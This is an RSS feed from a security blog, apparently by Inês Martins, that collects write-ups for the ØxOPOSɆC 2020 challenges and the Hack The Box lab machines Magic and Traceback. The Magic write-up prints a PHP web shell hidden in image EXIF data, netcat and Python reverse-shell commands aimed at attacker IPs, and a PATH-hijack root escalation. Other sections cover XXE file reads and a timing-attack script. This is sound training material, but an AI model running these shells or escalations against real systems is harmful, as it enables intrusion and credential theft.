<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Fri, 25 Sep 2020 18:52:02 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up]]></title><description><![CDATA[<h2 id="1-my-paste-100">1 . My Paste | 100</h2><blockquote>Oh no! I forgot where I left my paste. 🗑<br>Perhaps you can help me find it?</blockquote><p>The source code has a little hidden clue:</p><pre><code>&lt;span class="challenge-desc"&gt;&lt;br&gt;
Oh no! I forgot where I left my paste.  🗑
&lt;p&gt;Perhaps you</code></pre>]]></description><link>https://inesmartins.github.io//oposec-summer-challenge-2020/</link><guid isPermaLink="false">5f19d1cf1e7da103a083f24c</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 25 Sep 2020 18:51:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/heading3.png" medium="image"/><content:encoded><![CDATA[<h2 id="1-my-paste-100">1 . My Paste | 100</h2><blockquote>Oh no! I forgot where I left my paste. 🗑<br>Perhaps you can help me find it?</blockquote><img src="https://inesmartins.github.io//content/images/2020/09/heading3.png" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"><p>The source code has a little hidden clue:</p><pre><code>&lt;span class="challenge-desc"&gt;&lt;br&gt;
Oh no! I forgot where I left my paste.  🗑
&lt;p&gt;Perhaps you can help me find it?&lt;/p&gt;
&lt;p style="color: white"&gt;2WvYM5Qx&lt;/p&gt;&lt;/span&gt;</code></pre><p>Since <code>2WvYM5Qx</code> is not the correct flag, it was a matter of thinking outside the box to get to the final answer:  <a href="https://pastebin.com/2WvYM5Qx">https://pastebin.com/2WvYM5Qx</a>.</p><pre><code>Good job!
flag{f1n0_5Up3r_b0ck_fr3squ1nho}</code></pre><hr><h2 id="2-slowly-but-surely-200">2. Slowly But Surely | 200</h2><blockquote>I think aliens may be trying to communicate.<br>What are they trying to say?</blockquote><p>Let's take a look at some basic info about the <code>trasmission.wav</code> file using <code>mediainfo</code>:</p><pre><code>~ mediainfo transmission.wav

General
Complete name                            : transmission.wav
Format                                   : Wave
File size                                : 10.6 MiB
Duration                                 : 1 min 56 s
Overall bit rate mode                    : Constant
Overall bit rate                         : 768 kb/s

Audio
Format                                   : PCM
Format settings                          : Little / Signed
Codec ID                                 : 1
Duration                                 : 1 min 56 s
Bit rate mode                            : Constant
Bit rate                                 : 768 kb/s
Channel(s)                               : 1 channel
Sampling rate                            : 48.0 kHz
Bit depth                                : 16 bits
Stream size                              : 10.6 MiB (100%)</code></pre><p>After discarding the usual audio steganography I decided to take a look at the audio's spectrogram using <a href="https://www.sonicvisualiser.org/">Sonic Visualiser</a>. </p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-5.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><p>Because I'm not an expert on audio signals, I decided to Google Image search for signals that looked similar to the one shown on the spectrogram. It didn't take long until I came across <a href="https://bolek42.github.io/ctf/2017-PlaidCTF/terebeep/README.html">this write-up</a> with an eerily similar signal, that corresponds to a <a href="https://en.wikipedia.org/wiki/Slow-scan_television">SSTV (Slow Scan TeleVision)</a> transmission.</p><blockquote>Slow Scan television (SSTV) is a picture transmission method used mainly by amateur radio operators, to transmit and receive static pictures via radio in monochrome or color.</blockquote><p>This plus the hint let me know I was on the right track (however I later found out I should really be using <a href="https://inesmartins.github.io//p/e400ca1f-a8ad-467c-aecb-2103a5dde81e/www.sigidwiki.co">sigid</a> to identify the signal).</p><p>After spending <em>a lot </em>of time trying to make some Linux tools work for this task I had to use Windows <a href="http://rxsstv.cqsstv.com/">RX-SSTV</a> to finally decode the message:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/WhatsApp-Image-2020-07-26-at-10.56.50--1-.jpeg" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><hr><h2 id="3-run-300-">3. Run (300)</h2><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-26.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><p>This was the only challenge I wasn't able to finish. It turns out this image is actually a program "written" in the the <a href="https://esolangs.org/wiki/Piet">Piet esolang</a>. </p><blockquote>Piet is a <a href="https://esolangs.org/wiki/Stack">stack-based</a><a href="https://esolangs.org/wiki/Esoteric_programming_language">esoteric programming language</a> in which programs look like abstract paintings. It uses 20 colors, of which 18 are related cyclically through a lightness cycle and a hue cycle. [<a href="https://esolangs.org/wiki/Piet">Source</a>]</blockquote><p>There's a handy utility called <a href="https://www.bertnase.de/npiet/">npiet</a> that we could use to get the flag from the file (I had to convert it to PPM first).</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-37.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"></figure><hr><h2 id="helpful-sources">Helpful Sources</h2><ul><li><a href="https://bolek42.github.io/ctf/2017-PlaidCTF/terebeep/README.html">https://bolek42.github.io/ctf/2017-PlaidCTF/terebeep/README.html</a></li><li><a href="https://wiki.gnuradio.org/index.php/Wav_File_Source">https://wiki.gnuradio.org/index.php/Wav_File_Source</a></li><li><a href="https://charlesreid1.com/wiki/Gnuradio/Wav_to_Waterfall">https://charlesreid1.com/wiki/Gnuradio/Wav_to_Waterfall</a></li><li><a href="https://medium.com/analytics-vidhya/get-secret-message-from-audio-file-8769421205c3">https://medium.com/analytics-vidhya/get-secret-message-from-audio-file-8769421205c3</a></li><li><a href="https://trailofbits.github.io/ctf/forensics/">https://trailofbits.github.io/ctf/forensics/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up]]></title><description><![CDATA[<h2 id="knock-knock-100-">Knock Knock (100)</h2><blockquote><code>21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }</code></blockquote><p>Since I knew the 4 four numbers probably corresponded to the word <code>flag</code>, I was able to get the rest of the flag with some "leaps of logic", however, this only worked because</p>]]></description><link>https://inesmartins.github.io//oxopos-c-summer-challenge-2020-web-challenges-write-up/</link><guid isPermaLink="false">5f19e8b81e7da103a083f2ca</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 25 Sep 2020 10:30:14 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/headers1.png" medium="image"/><content:encoded><![CDATA[<h2 id="knock-knock-100-">Knock Knock (100)</h2><blockquote><code>21 31 11 22 { 32 11 44 15 45 43 42 34 43 15 }</code></blockquote><img src="https://inesmartins.github.io//content/images/2020/09/headers1.png" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"><p>Since I knew the 4 four numbers probably corresponded to the word <code>flag</code>, I was able to get the rest of the flag with some "leaps of logic", however, this only worked because the flag contained words that I recognised. If that weren't the case I would've had to know about <a href="https://en.wikipedia.org/wiki/Tap_code">Tap Code</a>, aka Knock Code.</p><p>Basically, by knowing this:</p><pre><code>a =&gt; 11
f =&gt; 21
g =&gt; 22
l =&gt; 31</code></pre><p>I was able to get to this (with some tweaking):</p><pre><code>a =&gt; 11
b =&gt; 12
c =&gt; 13
d =&gt; 14
e =&gt; 15

// 6 number jump 

f =&gt; 21
g =&gt; 22
h =&gt; 23
i =&gt; 24
j =&gt; 25
k =&gt; 26

// 5 number jump 

l =&gt; 31
m =&gt; 32
n =&gt; 33
o =&gt; 34
p =&gt; 35
q =&gt; 36

// 6 number jump 

r =&gt; 42
s =&gt; 43
t =&gt; 44
u =&gt; 45</code></pre><p>Which got me the flag:  <code>flag{mateusrose}</code> </p><hr><h2 id="pancetta-200-">Pancetta (200)</h2><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-4.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"></figure><p>When I heard pancetta I immediately thought of the <a href="https://en.wikipedia.org/wiki/Bacon%27s_cipher">Bacon cipher</a>. I replaced every pink letter with a <code>1</code> and every black letter with a <code>0</code> and then decoded the cipher-text using <a href="https://gchq.github.io/CyberChef/#recipe=Bacon_Cipher_Decode('Standard%20(I%3DJ%20and%20U%3DV)','0/1',false)&amp;input=MTAwMDExMDAxIDEwIDExMDAwMCAwMTEwMDAgMDAwMCAxMDAwMDAxMCAwMDAwIDAxMCAwMDAwIDAwMCAwMDEwIDExMDAgMTAgMDAxMCAxMCAwMSAxMDExMSAxMDAxMTEwIDAxMTEwMDEgMTEwMDExIDEwIDAxMSAxMDAxIDExMDAxMSAxMDA">CyberChef</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-31.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"></figure><hr><h2 id="streamside-300-">Streamside (300)</h2><blockquote>No one will give you the flag this time.<br>You will find it out by yourself. Take your time.<br><a href="https://streamside.apl3b.com/">https://streamside.apl3b.com</a></blockquote><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-32.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Crypto Challenges Write-up"></figure><p>This challenge consisted of a web page with an input field where we could enter and validate a flag. After some poking around I realised that just by entering the word <code>flag</code> it took the server a lot longer to respond that when we entered something else, which made me think this was a <a href="https://en.wikipedia.org/wiki/Timing_attack">timing attack</a>.</p><p>Initially I created a Python script to find the complete flag automatically, but the results were unreliable so I decided to use the script to output the results for each letter of the flag, and then analyse them manually:</p><pre><code>~ cat curl-format.txt
time_total:  %{time_total}</code></pre><pre><code class="language-python">import os

alphabet = "abcdefghijklmnopqrstuvxwyz0123456789ABCDEFGHIJKLMNOPQRSTUVXWYZ!\"#$%&amp;/()=?*`|^_:;-"
url = "https://streamside.apl3b.com/process"
output_filename = "output.txt"
format_filename = "@curl-format.txt"

result_str = ""
os.system("rm " + output_filename)

for letter in alphabet:

    # builds new test flag
    tmp_flag = "flag=flag{" + letter + "}"

    # executes command
    print("Trying " + tmp_flag)
    cmd = "curl -s -d '" + tmp_flag + "' -w '" + format_filename + "' -X POST " + url
    result = os.popen(cmd).read()

    # parses result and prints it
    answer = result.split(" ")[0].split("\n")[0].strip()
    time_total = result.split("time_total:")[1].strip()

    # saves result to string
    result_str += letter + "=" + str(time_total) + "\n"

    # checks message
    if "Wrong" not in answer:
        print("Found it! Flag is " + tmp_flag)
    
os.system("echo '" + result_str + "' &gt; " + output_filename)
os.system("open " + output_filename)</code></pre><p>And we get the flag: <code>flag{c4l1Po_de_l1M4o}</code>.</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up]]></title><description><![CDATA[<h2 id="passive-aggressive-flask-100-">Passive-Aggressive Flask (100)</h2><blockquote>I can give you a flag, but you'll have to be nice.<br>Remember to say it LOUD, so I can hear you.<br><a href="https://passiveaggressive.apl3b.com/">https://passiveaggressive.apl3b.com</a></blockquote><pre><code>~ curl https://passiveaggressive.apl3b.com

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta charset="utf-8"</code></pre>]]></description><link>https://inesmartins.github.io//oposec-summer-challenge-2020-web-challenges-write-up/</link><guid isPermaLink="false">5f19e6891e7da103a083f2a8</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 24 Sep 2020 18:49:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/09/header2.png" medium="image"/><content:encoded><![CDATA[<h2 id="passive-aggressive-flask-100-">Passive-Aggressive Flask (100)</h2><blockquote>I can give you a flag, but you'll have to be nice.<br>Remember to say it LOUD, so I can hear you.<br><a href="https://passiveaggressive.apl3b.com/">https://passiveaggressive.apl3b.com</a></blockquote><pre><code>~ curl https://passiveaggressive.apl3b.com

&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
  &lt;meta charset="utf-8"&gt;
  &lt;title&gt;Passive-Aggressive Flask&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
Not so fast.
&lt;br&gt;
You think you can just boss me around? 😠
&lt;br&gt;
Be &lt;i&gt;polite&lt;/i&gt;!
&lt;/body&gt;
&lt;/html&gt;%</code></pre><img src="https://inesmartins.github.io//content/images/2020/09/header2.png" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"><p>Looking at the clues I was pretty sure this challenge was going to be solved by sending some sort of specific keyword, such as "please" on all caps (because of the LOUD clue), but I wasn't sure how.</p><p>After some trial and error I finally got it:</p><pre><code>~ curl -X PLEASE https://passiveaggressive.apl3b.com

...
&lt;body&gt;
Oh, finally someone who shows some respect. ☺️
&lt;br&gt;
Here, take this juicy flag: &lt;i&gt;flag{g4spach0_n0_t4ch0}&lt;/i&gt;!
&lt;br&gt;
(props to Pixels Camp 2020 Quiz Qualifiers &lt;3)
&lt;/body&gt;
&lt;/html&gt;%</code></pre><hr><h2 id="2020-200-">2020 (200)</h2><blockquote>Just represent the number 2020.<br>Easy, right? No digits allowed.<br><a href="https://2020.apl3b.com/">https://2020.apl3b.com</a></blockquote><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-6.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>Let's take a look at the source code to see what kind of validations are taking place:</p><pre><code class="language-javascript">...
app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';
  if (code &amp;&amp; code.length &lt; 300 &amp;&amp; !/[^a-z().]/.test(code)) {
    try {
      const result = vm.runInNewContext(code, {}, { timeout: 500 });
      if (result === 2020) {
        output = process.env.FLAG;
      } else {
        output = 'nope';
      }
    } catch (e) {
      output = 'nope';
    }
  } else {
    output = 'nope';
  }
  res.render('index', { title: '[a-z().]', output });
});
...</code></pre><p>So, basically we need to find a piece of JS code that:</p><ul><li>is under 300 characters;</li><li>matches this REGEX: <code>!/[^a-z().]/</code>;</li><li>produces the number <code>2020</code>;</li><li>uses functions and variables known to the <code>NodeJS</code> context.</li></ul><p>This last condition ended up being the hardest, and I had to rely pretty heavily on the <code>eval</code> function:</p><pre><code>eval.length.constructor(                  // Number()
  eval.name.constructor.apply()           // String()
    .concat(eval.name.big.apply.length)   // 2
    .concat(eval.name.bold.length)        // 0
    .concat(eval.name.big.apply.length)   // 2
    .concat(eval.name.bold.length))       // 0</code></pre><p>Alternatively I found one that's a little longer:</p><pre><code>eval.length.constructor(
  eval.name.constructor.apply()
    .concat(((typeof(null))
      .concat((typeof(null)))
      .concat(typeof(eval)).length))
    .concat(((typeof(null))
      .concat((typeof(null)))
      .concat(typeof(eval)).length)))</code></pre><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/09/image-36.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><hr><h2 id="extensible-risky-language-300-">Extensible Risky Language (300)</h2><blockquote>Your flag is securely stored in <code>/etc/passwd</code> .<br><a href="https://risky.apl3b.com/">https://risky.apl3b.com</a></blockquote><p>I smell an <code>XXE</code> attack!</p><p>When we submit our shoe size, the size is reflected below the input field, so I immediately thought the idea was to manipulate the <code>XML</code> sent to the server in order to fetch the <code>/etc/passwd</code> file.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-13.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>If this wasn't enough of a clue, it looks like the devs are not great at XML.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-11.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>And indeed when we send a <code>POST</code> request to <a href="https://risky.apl3b.com/process">https://risky.apl3b.com/process</a> with our shoe size, the form data is sent in XML:</p><pre><code>xml: &lt;stock&gt;&lt;size&gt;34&lt;/size&gt;&lt;/stock&gt;</code></pre><p>Let's exploit <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">this vulnerability</a> to get the content of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/image-15.png" class="kg-image" alt="ØxOPOSɆC Summer Challenge 2020 | Web Challenges Write-up"></figure><p>And we get our flag: <code>flag{g3lat1na_r0y4l_m0raNg0}</code>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Magic]]></title><description><![CDATA[<h2 id="scanning"><br>Scanning</h2><p>As always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A magic.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10</code></pre>]]></description><link>https://inesmartins.github.io//dnp-htb-write-up/</link><guid isPermaLink="false">5edf98963d00be7291b53615</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 27 Aug 2020 12:14:17 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/08/magic.png" medium="image"/><content:encoded><![CDATA[<h2 id="scanning"><br>Scanning</h2><img src="https://inesmartins.github.io//content/images/2020/08/magic.png" alt="HTB Write-up | Magic"><p>As always, we start with some basic scanning which discloses only an instance of OpenSSH running on port 22 and an Apache web server running on port 80 - pretty typical stuff.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A magic.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 15:10 WEST
Nmap scan report for magic.htb (10.10.10.185)
Host is up (0.046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds
</code></pre>
<!--kg-card-end: markdown--><p>The website is just a simple image gallery, but there is a link to a login form on the bottom left.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main-1.png" class="kg-image" alt="HTB Write-up | Magic"></figure><p>Bypassing authentication was pretty straightforward with SQL Injection - I think this was my first attempt.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-5.png" class="kg-image" alt="HTB Write-up | Magic"></figure><p>Once the login succeeds, we're redirected to an <a href="http://10.10.10.185/upload.php">Upload</a> page.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/upload.png" class="kg-image" alt="HTB Write-up | Magic"></figure><h2 id="bypassing-upload-filters">Bypassing Upload Filters</h2><p>This upload feature only accepts JPG, JPEG or PNG files. This is validated by checking both file extension and MIME type, so uploading a PHP script directly is out of the question. </p><p>To get around these restrictions I ended up following <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">this</a> tutorial:</p><ol><li>Create a script that lets us execute any command on the machine, with the help of the <a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> function:</li></ol><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://inesmartins.github.io//content/images/2020/06/image-21.png" class="kg-image" alt="HTB Write-up | Magic"><figcaption>Source: <a href="https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3">https://medium.com/bugbountywriteup/hackthebox-networked-93ebbd6a70e3</a></figcaption></figure><p>2. Embed the script in a valid image using <a href="http://steghide.sourceforge.net/">steghide</a>:</p><!--kg-card-begin: markdown--><pre><code>$ steghide embed -cf dog.jpg -ef shell.php
</code></pre>
<!--kg-card-end: markdown--><p>3. Manipulate the EXIF data:</p><!--kg-card-begin: markdown--><pre><code>$ exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' dog.jpg
</code></pre>
<!--kg-card-end: markdown--><p>4. Change the file extension:</p><!--kg-card-begin: markdown--><pre><code>$ mv dog.jpg dog.php.jpg
</code></pre>
<!--kg-card-end: markdown--><p>Finally, we get an RCE, which we use to get a reverse shell:</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=./nc%2010.10.15.114%204444%20-e%20/bin/sh
</code></pre>
<!--kg-card-end: markdown--><h2 id="getting-user">Getting User</h2><p>Authenticated as wwwdata, we start poking around the web server files and find the credentials for the mySQL database, which then allows us to dump the contents of the app's database using the <a href="https://dev.mysql.com/doc/refman/8.0/en/mysqldump.html">mysqldump</a> binary:</p><!--kg-card-begin: markdown--><pre><code>~ /usr/bin/mysqldump --user=theseus --password=iamkingtheseus Magic login &gt; /var/www/Magic/dbdump.sql

~ cat /var/www/Magic/dbdump.sq
...
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
...
</code></pre>
<!--kg-card-end: markdown--><p>We now have credentials for the user theseus but need to upgrade our shell to be able to authenticate, since SSH access is only enabled with RSA.</p><!--kg-card-begin: markdown--><pre><code>http://10.10.10.185/images/uploads/dog.php.jpg?cmd=/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.52&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)'
</code></pre>
<!--kg-card-end: markdown--><p>With this interactive shell we can now authenticate via su.</p><!--kg-card-begin: markdown--><pre><code>www-data@ubuntu:/var/www/Magic/images/uploads$ su - theseus
Password: Th3s3usW4sK1ng
theseus@ubuntu:~$ </code></pre>
<!--kg-card-end: markdown--><h2 id="path-to-root">Path to Root</h2><p>Root was a lot more straightforward. We started by running <a href="https://github.com/Anon-Exploiter/SUID3NUM">SUID3NUM</a> which found only one noteworthy file - <strong>/bin/sysinfo</strong> - so we investigate it.</p><!--kg-card-begin: markdown--><pre><code>~ strings /bin/sysinfo
...
setuid
...
====================Hardware Info====================
lshw -short
...
</code></pre>
<!--kg-card-end: markdown--><p>As we can see above, the file runs <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a> at one point and right after it prints the output of the <a href="http://manpages.ubuntu.com/manpages/trusty/man1/lshw.1.html">lshw</a> (list hardware) binary. However, there is no path to this binary, which means we can alter the $PATH so that instead of the actual lshw binary, we can get root to run our fake lshw, which prints out the root flag:</p><!--kg-card-begin: markdown--><pre><code>theseus@ubuntu:~$ mkdir /tmp/.abc
theseus@ubuntu:~$ export PATH=/tmp/.abc:$PATH
theseus@ubuntu:~$ touch /tmp/.abc/lshw
theseus@ubuntu:~$ echo &quot;cat /root/root.txt&quot; &gt;&gt; /tmp/.abc/lshw
theseus@ubuntu:~$ chmod 777 /tmp/.abc/lshw
</code></pre>
<!--kg-card-end: markdown--><p>Now, we just need to run the sysinfo binary and in the output there's the root flag instead of the lshw output.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Traceback]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A traceback.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-traceback/</link><guid isPermaLink="false">5ee54aef3d00be7291b542b6</guid><category><![CDATA[htb]]></category><category><![CDATA[smevk]]></category><category><![CDATA[lua]]></category><category><![CDATA[cron]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 27 Aug 2020 12:14:04 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/06/traceback-1.png" alt="HTB Write-up | Traceback"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/233">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>The scanning gives us very little: an instance of OpenSSH running on port 22 and an Apache server running on port 80 with the title "Help us".</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A traceback.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 22:58 WEST
Nmap scan report for 10.10.10.181
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
</code></pre>
<!--kg-card-end: markdown--><p>The website is also very simple, there's only one page with the following text:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/trackeback_main.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>Looking at the source code we see some additional information: </p><!--kg-card-begin: markdown--><pre><code>&lt;h1&gt;This site has been owned&lt;/h1&gt;
&lt;h2&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/h2&gt;
&lt;h3&gt; - Xh4H - &lt;/h3&gt;
&lt;!--Some of the best web shells that you might need ;)--&gt;
</code></pre>
<!--kg-card-end: markdown--><p>After some googling we see that the phrase "Some of the best web shells that you might need" is taken from the Github repo for the <a href="https://github.com/Xh4H/Web-Shells">Web-Shells project</a>. </p><p>This project contains multiple scripts and so I created a very simple Python script to test if any of these produced any result:</p><pre><code class="language-python">import os

shells=["alfa3.php", "alfav3.0.1.php", "andela.php", "bloodsecv4.php", "by.php", "c99ud.php", "cmd.php", "configkillerionkros.php", "jspshell.jsp", "mini.php", "obfuscated-punknopass.php", "punk-nopass.p$
for shell in shells:
  print(shell)
  res = os.system("curl http://traceback.htb:80/" + shell)
  print(res)</code></pre><p>The only script that doesn't return 404 is <a href="https://inesmartins.github.io//p/791ca428-2df4-4f4f-8b65-7e7defda57e3/traceback.htb/smevk.php">smevk</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/smevk.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>Looking at <a href="https://github.com/Xh4H/Web-Shells/blob/master/smevk.php">the shell's source code on Github</a>, we see that the default credentials are <code>admin/admin</code>, and so we used them to authenticate.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/authed.png" class="kg-image" alt="HTB Write-up | Traceback"></figure><p>smevk is basically a GUI that enables us to interact with the system as the user <code>webadmin</code>.</p><h2 id="practicing-our-lua">Practicing our LUA</h2><p>On the user's <code>home</code> directory we find a bunch of files in the <a href="http://www.lua.org/">Lua programming language</a> and a note:</p><!--kg-card-begin: markdown--><pre><code>- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
</code></pre>
<!--kg-card-end: markdown--><p>Running <code>sudo -l</code> we realise that the user is able to run the <code>luvit</code> binary as sudo:</p><!--kg-card-begin: markdown--><pre><code>$ sudo -l
Matching Defaults entries for webadmin on traceback:
  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
  (sysadmin) NOPASSWD: /home/sysadmin/luvit
```</code></pre>
<!--kg-card-end: markdown--><p>So, we go to the console interface and run the binary as sudo:</p><!--kg-card-begin: markdown--><pre><code>~ sudo -u sysadmin /home/sysadmin/luvit
Welcome to the [0mL[0muv[0mit[0m repl!&gt;
</code></pre>
<!--kg-card-end: markdown--><p>According to its <a href="https://github.com/develephant/luvit-docs/wiki/repl">documentation</a>, this REPL can run a .lua file passed as an argument. So, we create a .lua file that prints the user flag:</p><pre><code class="language-Lua">print(os.execute("cat /home/sysadmin/user.txt"))</code></pre><p>and then run it as sudo:</p><!--kg-card-begin: markdown--><p><code>$ sudo -u sysadmin /home/sysadmin/luvit test.lua</code></p>
